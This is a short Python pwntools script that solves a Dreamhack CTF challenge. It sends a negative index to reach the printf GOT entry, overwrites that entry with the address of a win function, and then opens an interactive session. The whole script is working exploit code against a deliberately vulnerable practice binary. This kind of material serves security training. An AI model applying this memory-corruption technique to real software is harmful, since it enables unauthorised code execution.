from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/p_rho/deploy/prob')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:17345'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

print(elf.got)
p.recvuntil(b"val: ")
p.sendline(b"-15") #to printf got, in unsigned long
p.sendline(b"4198838") #address of win in decimal

p.interactive()
